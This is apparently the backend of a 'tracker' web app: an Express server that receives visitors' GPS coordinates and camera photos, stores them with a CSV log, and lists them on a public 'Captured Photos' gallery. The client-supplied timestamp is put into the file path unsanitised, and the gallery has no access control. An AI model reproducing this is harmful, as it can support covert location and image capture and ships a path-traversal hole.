const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Ensure directories exist
const publicDir = path.join(__dirname, 'public');
const photosDir = path.join(__dirname, 'photos');
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
if (!fs.existsSync(photosDir)) fs.mkdirSync(photosDir);

// Serve static frontend assets
app.use(express.static(publicDir));
app.use(express.json({ limit: '10mb' }));

// Serve saved images under /photos
app.use('/photos', express.static(photosDir));

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

// Handle log POST: save image and log CSV
app.post('/log', (req, res) => {
  const { latitude, longitude, accuracy, photo, timestamp } = req.body;
  const filename = `${timestamp.replace(/[:.]/g, '-')}.png`;
  const filePath = path.join(photosDir, filename);
  const base64Data = photo.replace(/^data:image\/[a-z]+;base64,/, '');
  fs.writeFileSync(filePath, base64Data, 'base64');
  const logEntry = `${timestamp},${latitude},${longitude},${accuracy},${filename}\n`;
  fs.appendFileSync(path.join(__dirname, 'log.csv'), logEntry);
  res.sendStatus(200);
});

// Gallery endpoint: list and display all saved images
app.get('/gallery', (req, res) => {
  fs.readdir(photosDir, (err, files) => {
    if (err) return res.status(500).send('Failed to load gallery');
    const images = files.filter(f => f.toLowerCase().endsWith('.png')).sort((a, b) => b.localeCompare(a));
    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"/><title>Gallery</title></head><body style="font-family:sans-serif; text-align:center; padding:20px;">';
    html += '<h1>Captured Photos</h1>';
    images.forEach(file => {
      html += `
        <div style="display:inline-block; margin:10px;">
          <a href="/photos/${file}" target="_blank">
            <img src="/photos/${file}" width="150" style="border:1px solid #ccc;"/>
          </a>
          <div><small>${file}</small></div>
        </div>
      `;
    });
    html += '<p><a href="/" style="display:block; margin-top:20px;">Back to Tracker</a></p>';
    html += '</body></html>';
    res.send(html);
  });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
